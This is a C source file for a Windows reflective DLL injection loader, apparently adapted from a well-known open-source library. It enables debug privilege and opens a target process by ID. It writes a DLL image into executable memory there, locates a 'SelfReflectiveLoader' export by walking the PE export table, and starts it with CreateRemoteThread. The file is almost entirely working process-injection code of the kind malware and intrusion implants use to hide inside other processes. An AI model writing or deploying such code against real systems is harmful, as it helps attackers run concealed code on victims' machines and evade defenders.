// cl.exe -DDEBUG -DWIN_X64 loader.c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include "loader.h"

#pragma comment(lib,"Advapi32.lib")
#pragma comment(lib,"onecore.lib")

// Simple app to inject a reflective DLL into a process vis its process ID.
        // Usage: inject.exe [pid] [dll_file]
        // New Usage:   inject(pid, dll_in_memory_heap_alloc'd, length_of_dll)
int inject( DWORD dwProcessId, LPVOID lpBuffer, DWORD dwLength )
{
    HANDLE hModule      = NULL;
    HANDLE hProcess     = NULL;
    HANDLE hToken       = NULL;
    TOKEN_PRIVILEGES priv = {0};

    dprintf("Targeting PID: %d\n", dwProcessId);

    if( OpenProcessToken( GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken ) )
    {
        priv.PrivilegeCount           = 1;
        priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    
        if( LookupPrivilegeValue( NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid ) )
            AdjustTokenPrivileges( hToken, FALSE, &priv, 0, NULL, NULL );

        CloseHandle( hToken );
    }

    hProcess = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId );
    if( !hProcess )
    {
        dprintf( "Failed to open the target process: " );
        return 1;
    }

    HANDLE hFileMapping = CreateFileMappingA(
        INVALID_HANDLE_VALUE,
        NULL,
        PAGE_READWRITE,
        0,
        256,
        NULL
    );
    if (hFileMapping == NULL)
    {
        dprintf("Error creating file mapping: %d\n", GetLastError());
    }

    dprintf("File mapping creation: %p\n", hFileMapping);

    LPVOID pBuf = MapViewOfFile(
        hFileMapping,   // handle to map object
        FILE_MAP_ALL_ACCESS,
        0,
        0,
        256);
    if (pBuf == NULL)
    {
        dprintf("Error mapping in original process: %d\n", GetLastError());
    }
    
    dprintf("Mapping in original process: %p\n", pBuf);

    PVOID injectBuffer = MapViewOfFile2(
      hFileMapping,
      hProcess,
      0,
      NULL,
      256,
      0,
      PAGE_READWRITE
    );
    if (injectBuffer == NULL)
    {
        dprintf("Error mapping in inject process: %d\n", GetLastError());
    }

    dprintf("Mapping in inject process: %p\n", injectBuffer);

    // In original code, last argument was NULL
    // We will pass through loaded memory address to avoid the caller() trick
    hModule = LoadRemoteLibraryR( hProcess, lpBuffer, dwLength, injectBuffer );
    CloseHandle( hProcess );
    if( !hModule )
    {
        dprintf( "Failed to inject the DLL" );
        return 1;
    }

    dprintf( "[+] Injected into process %d.", dwProcessId );
    // WaitForSingleObject( hModule, -1 );
    return 0;
}

HANDLE WINAPI LoadRemoteLibraryR( HANDLE hProcess, LPVOID lpBuffer, DWORD dwLength, PVOID injectBuffer )
{
    BOOL bSuccess                             = FALSE;
    LPVOID lpRemoteLibraryBuffer              = NULL;
    LPTHREAD_START_ROUTINE lpReflectiveLoader = NULL;
    HANDLE hThread                            = NULL;
    DWORD dwReflectiveLoaderOffset            = 0;
    DWORD dwThreadId                          = 0;

    __try
    {
        do
        {
            if( !hProcess  || !lpBuffer || !dwLength )
            {
                dprintf("Need some arguments!\n");
                break;
            }

            // check if the library has a ReflectiveLoader...
            dwReflectiveLoaderOffset = GetReflectiveLoaderOffset( lpBuffer );
            if( !dwReflectiveLoaderOffset )
            {
                dprintf("Error getting offset.\n");
                break;
            }

            struct Layout {
                LPVOID lpAddr;
                PVOID mutexBuffer;
                LPVOID originalAlloc;
                DWORD originalAllocLen;
            };

            dprintf("sizeof struct layout: %zu\n", sizeof(struct Layout));
            // alloc memory (RX) in the host process for the image...
            // TODO: Free this? Not necessary but would be nice.
            lpRemoteLibraryBuffer = VirtualAllocEx( hProcess, NULL, sizeof(struct Layout) + dwLength, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READ ); 
            if( !lpRemoteLibraryBuffer )
            {
                dprintf("Error calling VirtualAlloc.\n");
                break;
            }

            struct Layout layout;
            layout.lpAddr = lpRemoteLibraryBuffer;
            layout.mutexBuffer = injectBuffer;
            layout.originalAlloc = lpBuffer;
            layout.originalAllocLen = dwLength;

            dprintf("Write #1 at address: %p\n", lpRemoteLibraryBuffer);
            if( !WriteProcessMemory( hProcess, lpRemoteLibraryBuffer, &layout, sizeof(struct Layout), NULL ) )
            {
                dprintf("Error writing process memory #1.\n");
                break;
            }

            // Cast to char* so that pointer arithmetic adds single bytes
            LPVOID offset = ((char*)lpRemoteLibraryBuffer) + sizeof(struct Layout);

            dprintf("Write #2 at address: %p\n", offset);
            // write the image into the host process...
            if( !WriteProcessMemory( hProcess, offset, lpBuffer, dwLength, NULL ) )
            {
                dprintf("Error writing process memory #2.\n");
                break;
            }
            
            // add the offset to ReflectiveLoader() to the remote library address...
            lpReflectiveLoader = (LPTHREAD_START_ROUTINE)( (ULONG_PTR)offset + dwReflectiveLoaderOffset );

            // create a remote thread in the host process to call the ReflectiveLoader!
            //This was lpParameter instead of lpRemoteLibraryBuffer
            /*
            HANDLE CreateRemoteThread(
                    [in]  HANDLE                 hProcess,
                    [in]  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
                    [in]  SIZE_T                 dwStackSize,
                    [in]  LPTHREAD_START_ROUTINE lpStartAddress,
                    [in]  LPVOID                 lpParameter,
                    [in]  DWORD                  dwCreationFlags,
                    [out] LPDWORD                lpThreadId
            */


            hThread = CreateRemoteThread( hProcess, NULL, 1024*1024, lpReflectiveLoader, offset, 0, &dwThreadId );

        } while( 0 );

    }
    __except( EXCEPTION_EXECUTE_HANDLER )
    {
        dprintf("Uh! An error!\n");
        hThread = NULL;
    }

    return hThread;
}

DWORD GetReflectiveLoaderOffset( VOID * lpReflectiveDllBuffer )
{
    UINT_PTR uiBaseAddress   = 0;
    UINT_PTR uiExportDir     = 0;
    UINT_PTR uiNameArray     = 0;
    UINT_PTR uiAddressArray  = 0;
    UINT_PTR uiNameOrdinals  = 0;
    DWORD dwCounter          = 0;
#ifdef WIN_X64
    DWORD dwCompiledArch = 2;
#else
    // This will catch Win32 and WinRT.
    DWORD dwCompiledArch = 1;
#endif

    uiBaseAddress = (UINT_PTR)lpReflectiveDllBuffer;

    // get the File Offset of the modules NT Header
    uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;

    // currently we can only process a PE file which is the same type as the one this function has
    // been compiled as, due to various offsets in the PE structures being defined at compile time.
    if( ((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.Magic == 0x010B ) // PE32
    {
        if( dwCompiledArch != 1 )
            return 0;
    }
    else if( ((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.Magic == 0x020B ) // PE64
    {
        if( dwCompiledArch != 2 )
            return 0;
    }
    else
    {
        return 0;
    }

    // uiNameArray = the address of the modules export directory entry
    uiNameArray = (UINT_PTR)&((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];

    // get the File Offset of the export directory
    uiExportDir = uiBaseAddress + Rva2Offset( ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress, uiBaseAddress );

    // get the File Offset for the array of name pointers
    uiNameArray = uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfNames, uiBaseAddress );

    // get the File Offset for the array of addresses
    uiAddressArray = uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfFunctions, uiBaseAddress );

    // get the File Offset for the array of name ordinals
    uiNameOrdinals = uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfNameOrdinals, uiBaseAddress );    

    // get a counter for the number of exported functions...
    dwCounter = ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->NumberOfNames;

    // loop through all the exported functions to find the ReflectiveLoader
    while( dwCounter-- )
    {
        char * cpExportedFunctionName = (char *)(uiBaseAddress + Rva2Offset( DEREF_32( uiNameArray ), uiBaseAddress ));

        // TODO: Make a DLL that properly loads itself
        if( strstr( cpExportedFunctionName, "SelfReflectiveLoader" ) != NULL )
        {
            dprintf("Found SelfReflectiveLoader.\n");
            // get the File Offset for the array of addresses
            uiAddressArray = uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfFunctions, uiBaseAddress );    
    
            // use the functions name ordinal as an index into the array of name pointers
            uiAddressArray += ( DEREF_16( uiNameOrdinals ) * sizeof(DWORD) );

            // return the File Offset to the ReflectiveLoader() functions code...
            return Rva2Offset( DEREF_32( uiAddressArray ), uiBaseAddress );
        }
        // get the next exported function name
        uiNameArray += sizeof(DWORD);

        // get the next exported function name ordinal
        uiNameOrdinals += sizeof(WORD);
    }

    return 0;
}

DWORD Rva2Offset( DWORD dwRva, UINT_PTR uiBaseAddress )
{    
    WORD wIndex                          = 0;
    PIMAGE_SECTION_HEADER pSectionHeader = NULL;
    PIMAGE_NT_HEADERS pNtHeaders         = NULL;
    
    pNtHeaders = (PIMAGE_NT_HEADERS)(uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew);

    pSectionHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&pNtHeaders->OptionalHeader) + pNtHeaders->FileHeader.SizeOfOptionalHeader);

    if( dwRva < pSectionHeader[0].PointerToRawData )
        return dwRva;

    for( wIndex=0 ; wIndex < pNtHeaders->FileHeader.NumberOfSections ; wIndex++ )
    {   
        if( dwRva >= pSectionHeader[wIndex].VirtualAddress && dwRva < (pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].SizeOfRawData) )           
           return ( dwRva - pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].PointerToRawData );
    }
    
    return 0;
}

// #include "messagebox_r.h"

// int main(int argc, char** argv)
// {
//     // TODO: Do I even need to alloc this?
//     //LPVOID dll = malloc(messagebox_r_dll_len);
//     //memcpy(dll, messagebox_r_dll, messagebox_r_dll_len);
//     DWORD pid = atoi(argv[1]);
//     inject(pid, messagebox_r_dll, messagebox_r_dll_len);
// }